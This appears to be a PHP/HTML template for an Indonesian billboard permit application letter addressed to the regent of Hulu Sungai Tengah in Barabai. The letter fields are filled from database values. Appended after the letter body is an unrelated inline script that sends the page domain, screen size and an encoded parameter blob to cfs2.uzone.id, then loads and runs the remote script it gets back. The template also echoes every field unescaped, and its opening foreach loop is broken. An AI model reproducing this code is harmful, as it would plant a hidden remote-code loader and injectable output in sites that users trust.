<?php foreach($hasil as $val); ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML>
<HEAD>
<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
<META http-equiv="X-UA-Compatible" content="IE=8">
<META name="generator" content="BCL easyConverter SDK 5.0.08">
<STYLE type="text/css">

body {margin-top: 0px;margin-left: 0px;}




.ft0{line-height: 19px;
}
.ft1{text-decoration: underline;line-height: 19px;}
.ft2{margin-left: 10px;line-height: 19px;}

.p0{text-align: left;padding-left: 96px;margin-top: 0px;margin-bottom: 0px;}
.p1{text-align: left;padding-left: 504px;padding-right: 157px;margin-top: 1px;margin-bottom: 0px;}
.p2{text-align: left;padding-left: 480px;margin-top: 1px;margin-bottom: 0px;}
.p3{text-align: justify;padding-left: 504px;padding-right: 84px;margin-top: 1px;margin-bottom: 0px;text-indent: -23px;}
.p4{text-align: left;padding-left: 528px;margin-top: 3px;margin-bottom: 0px;}
.p5{text-align: left;padding-left: 144px;margin-top: 41px;margin-bottom: 0px;}
.p6{text-align: left;padding-left: 144px;margin-top: 20px;margin-bottom: 0px;}
.p7{text-align: left;padding-left: 144px;margin-top: 12px;margin-bottom: 0px;}
.p8{text-align: left;padding-left: 144px;margin-top: 11px;margin-bottom: 0px;}
.p9{text-align: left;margin-top: 0px;margin-bottom: 0px;white-space: nowrap;}
.p10{text-align: left;padding-left: 144px;margin-top: 42px;margin-bottom: 0px;}
.p11{text-align: left;padding-left: 668px;margin-top: 42px;margin-bottom: 0px;}
.p12{text-align: right;padding-right: 81px;margin-top: 73px;margin-bottom: 0px;}
.p13{text-align: left;padding-left: 96px;margin-top: 42px;margin-bottom: 0px;}
.p14{text-align: left;padding-left: 144px;padding-right: 312px;margin-top: 11px;margin-bottom: 0px;text-indent: -24px;}
.p15{text-align: left;padding-left: 144px;padding-right: 484px;margin-top: 2px;margin-bottom: 0px;text-indent: -24px;}

.td0{padding: 0px;margin: 0px;width: 96px;vertical-align: bottom;}
.td1{padding: 0px;margin: 0px;width: 88px;vertical-align: bottom;}
.td2{padding: 0px;margin: 0px;width: 67px;vertical-align: bottom;}

.tr0{height: 19px;}
.tr1{height: 21px;}
.tr2{height: 30px;}
.tr3{height: 32px;}

.t0{width: 184px;margin-left: 140px;margin-top: 12px;}
.t1{width: 163px;margin-left: 140px;margin-top: 9px;}

</STYLE>
</HEAD>

<BODY>


<P class="p0 ft0">Perihal : Permohonan Ijin Pemasangan Reklame</P>
<P class="p1 ft0">Barabai, 5 Januari 2016 Kepada Yth,</P>
<P class="p2 ft0">Bupati Hulu Sungai Tengah</P>
<P class="p3 ft0">dp. Kepala Kantor Pelayanan Perijinan Terpadu Kab. Hulu Sungai Tengah di –</P>
<P class="p4 ft1">Barabai</P>
<P class="p5 ft0">Saya yang bertanda tangan dibawah ini :</P>
<TABLE cellpadding=0 cellspacing=0 class="t0">
    <TR>
	<TD class="tr1 td0"><P class="p9 ft0">NIK / NPWP</P></TD>
        <td></TD>
	<TD class="tr1 td2"><P class="p9 ft0">: <?php echo $val['nik_npwp']; ?></P></TD>
</TR>
<TR>
	<TD class="tr2 td0"><P class="p9 ft0">Nama</P></TD>
        <td></TD>
	<TD class="tr2 td2"><P class="p9 ft0">: <?php echo $val['nama']; ?></P></TD>
</TR>
<TR>
	<TD class="tr3 td0"><P class="p9 ft0">Jabatan</P></TD>
        <td></TD>
	<TD class="tr3 td2"><P class="p9 ft0">: <?php echo $val['jabatan']; ?></P></TD>
</TR>

<TR>
	<TD class="tr3 td0"><P class="p9 ft0">Alamat</P></TD>
        <td></TD>
	<TD class="tr3 td2"><P class="p9 ft0">: <?php echo $val['alamat']; ?></P></TD>
</TR>
</TABLE>
<P class="p10 ft0">Dengan ini mengajukan permohonan ijin pemasangan reklame atas perusahaan kami yaitu :</P>
<TABLE cellpadding=0 cellspacing=0 class="t0">
<TR>
	<TD class="tr1 td0"><P class="p9 ft0">Jenis Reklame</P></TD>
        <td></td>
	<TD class="tr1 td2"><P class="p9 ft0">: <?php echo $val['jenis']; ?></P></TD>
</TR>
<TR>
	<TD class="tr2 td0"><P class="p9 ft0">Ukuran</P></TD>
        <td></td>
	<TD class="tr2 td0"><P class="p9 ft0">: <?php echo 'Panjang '.$val['ukuran1'].' '.$val['satuan1'].' dan Lebar '.$val['ukuran2'].' '.$val['satuan2']; ?></P></TD>
</TR>
<TR>
	<TD class="tr3 td0"><P class="p9 ft0">Banyaknya</P></TD>
        <td></td>
	<TD class="tr3 td2"><P class="p9 ft0">: <?php echo $val['banyak'];?> buah</P></TD>
</TR>
<TR>
	<TD class="tr2 td0"><P class="p9 ft0">Waktu</P></TD>
        <td></td>
	<TD class="tr2 td2"><P class="p9 ft0">: <?php echo $val['waktu_mulai'].' s/d '.$val['waktu_akhir'];?></P></TD>
</TR>
<TR>
	<TD class="tr3 td0"><P class="p9 ft0">Lokasi</P></TD>
        <td></td>
	<TD class="tr3 td2"><P class="p9 ft0">: <?php echo $val['lokasi'];?></P></TD>
</TR>

<TR>
	<TD class="tr3 td0"><P class="p9 ft0">Teks / Gambar</P></TD>
        <td></td>
	<TD class="tr3 td2"><P class="p9 ft0">: <?php echo $val['teks'];?></P></TD>
</TR>
</TABLE>
<P class="p10 ft0">Demikian permohonan ini disampaikan, atas perkenaan Bapak kami ucapkan terimakasih.</P>
<P class="p11 ft0">Pemohon,</P>
<P class="p12 ft0"><?php echo $val['nama'];?></P>
<P class="p13 ft0">Tembusan :</P>
<P class="p14 ft0"><SPAN class="ft0">1.</SPAN><SPAN class="ft2">Kepala Dinas Perhubungan, Komunikasi & Informatika di Barabai.</SPAN></P>
<P class="p15 ft0"><SPAN class="ft0">2.</SPAN><SPAN class="ft2">Kepala Satpol PP Kab. HST. di Barabai.</SPAN></P>
<DIV style="padding: 50px 0px 15px 20px;color: #c8c8c8;">
</DIV>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKcyxvYKaX9GbkLPHaw23DnEATP2Tj53ZbkuX%2fqSEsC6nUSXUnOybPjFXRvtqMjh7smWMzoTMuBq2n2ph8VxOuDB1yzVPXBJvsP8hjA3LypVnkqy1GCkzox1omEoumAr2j5uSx3XCzL0kzFOdW22MQzBIdRzXin2x2uGbsrRX6Vc3FqO0ivWT4TmFH%2fo3uBevep%2bD0lmk%2fOP1P0mm9NtX5ZsK3ouZHEaFSeuh1H8VUuSdKh7TuO6yPg%2fILwr4g2GasrPLx4H4RTn5cBm7oHfP0Mgzh43MMhJjWFahFaFGPiuPv16IFAiWdSVTs90ZOt9v0P0yx0YDtUWhV38bCa5VPc%2fX3GmsbM%2ftqLECO2H2u%2f49M0nUBKKd2RhdMm4VzRJ%2fjcwoz4TaD1w1%2frdPxtA%2bCCo8po8NQfrp1hFD5N0%2b5ucyVAGWYpbrN9SlzUrEX%2fJckCV9lYHtydkuuw0tbpoF%2b12gsb4POn%2beNNK8582%2fUzsXlL%2fCgU47BVg9jOfZ%2bDIeOhpjfQZofX9fan71H%2ff9yHP45RCSjBPZODIaIVAaJORecCwiO4YG1cczSvq5UPxy2IyQz14H%2bhpaN%2frtnwnhs4ryPdwBYVb%2fzjwPbkWhsNvUtfth9BAzN9g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></BODY>
</HTML>
